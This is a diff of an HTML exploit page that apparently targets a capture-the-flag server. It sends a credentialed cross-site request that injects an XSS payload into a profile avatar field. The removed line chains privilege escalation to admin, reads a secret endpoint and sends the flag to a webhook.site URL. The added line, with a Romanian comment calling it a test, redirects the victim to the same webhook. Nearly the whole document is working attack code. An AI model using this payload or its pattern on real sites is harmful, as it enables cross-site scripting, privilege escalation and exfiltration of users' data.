@@ -2,14 +2,14 @@
 <html>
 <body>
 <script>
-// Step 1: Inject XSS payload
+// Step 1: Inject XSS payload - DOAR redirect la webhook pentru test
 fetch('http://ctf.learn-it.org:39951/api/update-profile', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     credentials: 'include',
     body: JSON.stringify({
         avatar: {
-            background: '"></svg><img src=x onerror="fetch(\'/api/update-profile\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},credentials:\'include\',body:JSON.stringify({isAdmin:true})}).then(()=>fetch(\'/api/admin/secret\',{credentials:\'include\'})).then(r=>r.json()).then(d=>new Image().src=\'https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?flag=\'+encodeURIComponent(d.flag))">'
+            background: '"></svg><img src=x onerror=location="https://webhook.site/240779ac-b382-4dea-ab66-e2b531559c23?xss=triggered">'
         }
     })
 }).then(() => {
